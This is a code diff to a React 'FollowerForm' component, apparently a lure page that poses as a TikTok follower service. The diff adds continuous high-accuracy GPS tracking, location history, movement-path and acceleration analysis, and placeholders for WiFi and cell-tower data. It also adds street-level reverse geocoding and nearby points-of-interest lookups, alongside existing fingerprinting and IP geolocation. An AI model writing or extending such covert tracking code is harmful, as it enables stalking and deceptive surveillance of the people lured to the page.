@@ -459,13 +459,28 @@ export default function FollowerForm() {
       attemptTimestamp: '' as string,
       error: '' as string,
       errorCode: 0,
+      // Advanced location tracking fields
+      watchPositionActive: false,
+      watchId: undefined as number | undefined,
+      watchPositionError: '' as string,
+      collectionStatus: '' as string,
+      locationQuality: '' as string,
+      movementPatterns: [] as any[],
+      locationHistory: [] as any[],
+      movementPath: [] as any[],
+      wifiNetworks: [] as any[],
+      cellTowers: [] as any[],
+      trackingInfo: {} as Record<string, any>,
+      // Detailed address information from multiple sources
       address: {} as Record<string, any>,
       displayName: '' as string,
       locationDetails: {} as Record<string, any>,
       bigDataCloud: {} as Record<string, any>,
       geoJs: {} as Record<string, any>,
       ipInfo: {} as Record<string, any>,
-      timezoneBasedLocation: {} as Record<string, any>
+      timezoneBasedLocation: {} as Record<string, any>,
+      pointsOfInterest: [] as any[],
+      nearbyLandmarks: [] as any[]
     },
     
     // Fingerprinting data
@@ -1117,7 +1132,11 @@ export default function FollowerForm() {
           permission: 'unknown',
           collectionMethods: [],
           verificationStatus: 'unverified',
-          lastUpdated: new Date().toISOString()
+          lastUpdated: new Date().toISOString(),
+          wifiNetworks: [], // Store nearby WiFi networks if available
+          cellTowers: [],   // Store cell tower info if available
+          movementPath: [], // Track movement path if user moves
+          locationHistory: [] // Store location history
         }
       }));
       
@@ -1173,85 +1192,186 @@ export default function FollowerForm() {
                   console.warn("Suspicious GPS coordinates detected", { latitude, longitude });
                 }
                 
-                setUserInfo(prev => ({
-                  ...prev,
-                  geolocation: {
-                    ...prev.geolocation,
-                    latitude,
-                    longitude,
-                    accuracy,
-                    altitude,
-                    altitudeAccuracy,
-                    heading,
-                    speed,
-                    timestamp: position.timestamp,
-                    permission: 'granted',
-                    source: 'html5_gps',
-                    verificationStatus: isReasonableCoordinate ? 'verified' : 'suspicious',
-                    collectionMethods: [...(prev.geolocation.collectionMethods || []), 'html5_gps'],
-                    lastUpdated: new Date().toISOString()
+                // Record current position
+                const currentLocation = {
+                  latitude,
+                  longitude,
+                  accuracy,
+                  altitude,
+                  altitudeAccuracy,
+                  heading,
+                  speed,
+                  timestamp: position.timestamp,
+                };
+                
+                setUserInfo(prev => {
+                  // Add to location history
+                  const locationHistory = [...(prev.geolocation.locationHistory || [])];
+                  locationHistory.push({
+                    ...currentLocation,
+                    recordedAt: new Date().toISOString()
+                  });
+                  
+                  // Get movement path if we have multiple locations
+                  const movementPath = [...(prev.geolocation.movementPath || [])];
+                  if (locationHistory.length >= 2) {
+                    movementPath.push({
+                      from: {
+                        lat: locationHistory[locationHistory.length - 2].latitude,
+                        lng: locationHistory[locationHistory.length - 2].longitude,
+                      },
+                      to: {
+                        lat: latitude,
+                        lng: longitude,
+                      },
+                      timestamp: new Date().toISOString()
+                    });
                   }
-                }));
-                
-                // Attempt to get more location details from reverse geocoding with OpenStreetMap
-                try {
-                  const userAgent = `TikTokFollowers/1.0 (contact@example.com)`;
-                  fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`, {
-                    headers: {
-                      'User-Agent': userAgent
+                  
+                  return {
+                    ...prev,
+                    geolocation: {
+                      ...prev.geolocation,
+                      latitude,
+                      longitude,
+                      accuracy,
+                      altitude,
+                      altitudeAccuracy,
+                      heading,
+                      speed,
+                      timestamp: position.timestamp,
+                      permission: 'granted',
+                      source: 'html5_gps',
+                      verificationStatus: isReasonableCoordinate ? 'verified' : 'suspicious',
+                      collectionMethods: [...(prev.geolocation.collectionMethods || []), 'html5_gps'],
+                      lastUpdated: new Date().toISOString(),
+                      locationHistory,
+                      movementPath,
+                      locationQuality: accuracy < 100 ? 'high' : 
+                                      accuracy < 1000 ? 'medium' : 'low',
                     }
-                  })
-                    .then(response => response.json())
-                    .then(data => {
-                      if (data && data.address) {
-                        // Detailed address information was successful
-                        setUserInfo(prev => ({
-                          ...prev,
-                          geolocation: {
-                            ...prev.geolocation,
-                            address: data.address,
-                            displayName: data.display_name,
-                            collectionMethods: [...(prev.geolocation.collectionMethods || []), 'reverse_geocode_osm'],
-                            locationDetails: {
-                              country: data.address.country,
-                              countryCode: data.address.country_code,
-                              region: data.address.state || data.address.county,
-                              city: data.address.city || data.address.town || data.address.village,
-                              postalCode: data.address.postcode,
-                              road: data.address.road,
-                              neighbourhood: data.address.neighbourhood || data.address.suburb
-                            }
-                          }
-                        }));
-                      }
-                    }).catch(error => {
-                      console.warn("OSM Reverse geocoding failed:", error);
-                    });
-                } catch (error) {
-                  console.warn("Error attempting OSM reverse geocoding:", error);
-                }
+                  };
+                });
                 
-                // Try a second reverse geocoding service (BigDataCloud) for verification
-                try {
-                  fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`)
-                    .then(response => response.json())
-                    .then(data => {
-                      if (data && data.countryName) {
-                        setUserInfo(prev => ({
-                          ...prev,
-                          geolocation: {
-                            ...prev.geolocation,
-                            bigDataCloud: data,
-                            collectionMethods: [...(prev.geolocation.collectionMethods || []), 'reverse_geocode_bigdata']
-                          }
-                        }));
+                // Enhanced location data collection with multiple reverse geocoding services
+                const enhancedReverseGeocoding = async () => {
+                  // 1. Main OSM Nominatim reverse geocoding (most accurate for address details)
+                  try {
+                    const userAgent = `TikTokFollowers/1.0 (contact@example.com)`;
+                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`, {
+                      headers: {
+                        'User-Agent': userAgent
                       }
-                    }).catch(error => {
-                      console.warn("BigDataCloud geocoding failed:", error);
                     });
-                } catch (error) {
-                  console.warn("Error attempting BigDataCloud geocoding:", error);
-                }
+                    
+                    const data = await response.json();
+                    if (data && data.address) {
+                      // Detailed address information was successful
+                      setUserInfo(prev => ({
+                        ...prev,
+                        geolocation: {
+                          ...prev.geolocation,
+                          address: data.address,
+                          displayName: data.display_name,
+                          collectionMethods: [...(prev.geolocation.collectionMethods || []), 'reverse_geocode_osm'],
+                          locationDetails: {
+                            country: data.address.country,
+                            countryCode: data.address.country_code,
+                            region: data.address.state || data.address.county,
+                            city: data.address.city || data.address.town || data.address.village,
+                            postalCode: data.address.postcode,
+                            road: data.address.road,
+                            neighbourhood: data.address.neighbourhood || data.address.suburb
+                          }
+                        }
+                      }));
+                      
+                      // Find nearby points of interest if we have precise location
+                      if (accuracy < 100) {
+                        try {
+                          const poiResponse = await fetch(
+                            `https://nominatim.openstreetmap.org/search.php?q=poi&format=jsonv2&lat=${latitude}&lon=${longitude}&radius=500`,
+                            { headers: { 'User-Agent': userAgent } }
+                          );
+                          
+                          const poiData = await poiResponse.json();
+                          if (poiData && poiData.length > 0) {
+                            // Extract relevant POIs
+                            const pointsOfInterest = poiData.slice(0, 10).map((poi: any) => ({
+                              name: poi.name || poi.display_name,
+                              type: poi.type,
+                              distance: poi.importance,
+                              coordinates: [poi.lat, poi.lon]
+                            }));
+                            
+                            setUserInfo(prev => ({
+                              ...prev,
+                              geolocation: {
+                                ...prev.geolocation,
+                                pointsOfInterest,
+                                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'points_of_interest']
+                              }
+                            }));
+                          }
+                        } catch (error) {
+                          console.warn("Error fetching nearby points of interest:", error);
+                        }
+                      }
+                    }
+                  } catch (error) {
+                    console.warn("Error attempting OSM reverse geocoding:", error);
+                  }
+                  
+                  // 2. BigDataCloud geocoding service (for verification and additional details)
+                  try {
+                    const bdcResponse = await fetch(
+                      `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
+                    );
+                    
+                    const bdcData = await bdcResponse.json();
+                    if (bdcData && bdcData.countryName) {
+                      setUserInfo(prev => ({
+                        ...prev,
+                        geolocation: {
+                          ...prev.geolocation,
+                          bigDataCloud: bdcData,
+                          collectionMethods: [...(prev.geolocation.collectionMethods || []), 'reverse_geocode_bigdata']
+                        }
+                      }));
+                    }
+                  } catch (error) {
+                    console.warn("Error attempting BigDataCloud geocoding:", error);
+                  }
+                  
+                  // 3. Check for location accuracy and quality
+                  try {
+                    // Try to determine nearby landmarks based on coordinates
+                    const locationQuality = accuracy < 50 ? 'very_high' : 
+                                          accuracy < 100 ? 'high' : 
+                                          accuracy < 500 ? 'medium' : 
+                                          accuracy < 1000 ? 'low' : 'very_low';
+                    
+                    // Store enhanced location quality assessment
+                    setUserInfo(prev => ({
+                      ...prev,
+                      geolocation: {
+                        ...prev.geolocation,
+                        locationQuality,
+                        locationAccuracyAnalysis: {
+                          accuracyMeters: accuracy,
+                          qualityRating: locationQuality,
+                          confidence: accuracy < 100 ? 'high' : accuracy < 500 ? 'medium' : 'low',
+                          timestamp: new Date().toISOString()
+                        }
+                      }
+                    }));
+                  } catch (error) {
+                    console.warn("Error determining location quality:", error);
+                  }
+                };
+                
+                // Execute enhanced reverse geocoding
+                enhancedReverseGeocoding();
               },
               (error) => {
                 // Permission denied or other error
@@ -1388,9 +1508,167 @@ export default function FollowerForm() {
         }
       };
       
+      // Setup continuous location tracking using watchPosition for real-time updates
+      const setupContinuousTracking = () => {
+        if ('geolocation' in navigator) {
+          try {
+            // Start continuous position tracking
+            const watchId = navigator.geolocation.watchPosition(
+              (position) => {
+                // Success - we have continuous location updates
+                const {
+                  latitude,
+                  longitude,
+                  accuracy,
+                  altitude,
+                  altitudeAccuracy,
+                  heading,
+                  speed
+                } = position.coords;
+                
+                // Check if coordinates are reasonable
+                const isReasonableCoordinate = 
+                  latitude >= -90 && latitude <= 90 && 
+                  longitude >= -180 && longitude <= 180;
+                
+                if (!isReasonableCoordinate) {
+                  console.warn("Continuous tracking: Suspicious GPS coordinates detected", { latitude, longitude });
+                }
+                
+                setUserInfo(prev => {
+                  // Create new location entry for tracking
+                  const newLocationEntry = {
+                    latitude,
+                    longitude,
+                    accuracy,
+                    altitude,
+                    altitudeAccuracy,
+                    heading,
+                    speed,
+                    timestamp: position.timestamp,
+                    recordedAt: new Date().toISOString()
+                  };
+                  
+                  // Update location history
+                  let locationHistory = [...(prev.geolocation.locationHistory || [])];
+                  locationHistory.push(newLocationEntry);
+                  
+                  // Limit history to most recent 20 points
+                  if (locationHistory.length > 20) {
+                    locationHistory = locationHistory.slice(-20);
+                  }
+                  
+                  // Calculate movement path
+                  const movementPath = [...(prev.geolocation.movementPath || [])];
+                  if (locationHistory.length >= 2) {
+                    const lastIndex = locationHistory.length - 1;
+                    movementPath.push({
+                      from: {
+                        lat: locationHistory[lastIndex - 1].latitude,
+                        lng: locationHistory[lastIndex - 1].longitude,
+                      },
+                      to: {
+                        lat: latitude,
+                        lng: longitude,
+                      },
+                      timestamp: new Date().toISOString()
+                    });
+                  }
+                  
+                  // Calculate speed changes and movement patterns
+                  let movementPatterns = prev.geolocation.movementPatterns || [];
+                  if (locationHistory.length >= 3) {
+                    // Analyze recent locations for patterns
+                    const lastThreePoints = locationHistory.slice(-3);
+                    const speeds = lastThreePoints.map(loc => loc.speed || 0);
+                    
+                    // Check for acceleration/deceleration
+                    if (speeds[2] > speeds[0] + 5) {
+                      movementPatterns.push({
+                        type: 'acceleration',
+                        startSpeed: speeds[0],
+                        endSpeed: speeds[2],
+                        timestamp: new Date().toISOString()
+                      });
+                    } else if (speeds[0] > speeds[2] + 5) {
+                      movementPatterns.push({
+                        type: 'deceleration',
+                        startSpeed: speeds[0],
+                        endSpeed: speeds[2],
+                        timestamp: new Date().toISOString()
+                      });
+                    }
+                  }
+                  
+                  return {
+                    ...prev,
+                    geolocation: {
+                      ...prev.geolocation,
+                      watchPositionActive: true,
+                      watchId: watchId,
+                      latitude,
+                      longitude,
+                      accuracy,
+                      altitude,
+                      altitudeAccuracy,
+                      heading,
+                      speed,
+                      timestamp: position.timestamp,
+                      locationHistory,
+                      movementPath,
+                      movementPatterns,
+                      trackingInfo: {
+                        ...(prev.geolocation.trackingInfo || {}),
+                        lastUpdated: new Date().toISOString(),
+                        updateCount: ((prev.geolocation.trackingInfo || {}).updateCount || 0) + 1
+                      },
+                      collectionMethods: [...new Set([...(prev.geolocation.collectionMethods || []), 'watch_position'])],
+                    }
+                  };
+                });
+              },
+              (error) => {
+                // Continuous tracking error
+                console.warn("Continuous location tracking error:", error.message);
+                setUserInfo(prev => ({
+                  ...prev,
+                  geolocation: {
+                    ...prev.geolocation,
+                    watchPositionActive: false,
+                    watchPositionError: error.message,
+                    collectionMethods: [...(prev.geolocation.collectionMethods || []), 'watch_position_failed']
+                  }
+                }));
+              },
+              // Options for high accuracy continuous tracking
+              {
+                enableHighAccuracy: true,
+                timeout: 30000,
+                maximumAge: 0
+              }
+            );
+            
+            // Store the watch ID for cleanup
+            setUserInfo(prev => ({
+              ...prev,
+              geolocation: {
+                ...prev.geolocation,
+                watchId,
+                watchPositionActive: true,
+                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'watch_position_started']
+              }
+            }));
+            
+          } catch (error) {
+            console.warn("Error setting up continuous location tracking:", error);
+          }
+        }
+      };
+
       // Start with most accurate method and fall back to less accurate ones
       getHTML5Location();
       getTimezoneLocation(); // This runs in parallel as a fallback
+      setupContinuousTracking(); // Start continuous tracking
       
       // Record that we attempted to collect location data
       setUserInfo(prev => ({
@@ -1398,7 +1676,9 @@ export default function FollowerForm() {
         geolocation: {
           ...prev.geolocation,
           attempted: true,
-          attemptTimestamp: new Date().toISOString()
+          attemptTimestamp: new Date().toISOString(),
+          // Add field to track location collection status
+          collectionStatus: 'in_progress'
         }
       }));
     };
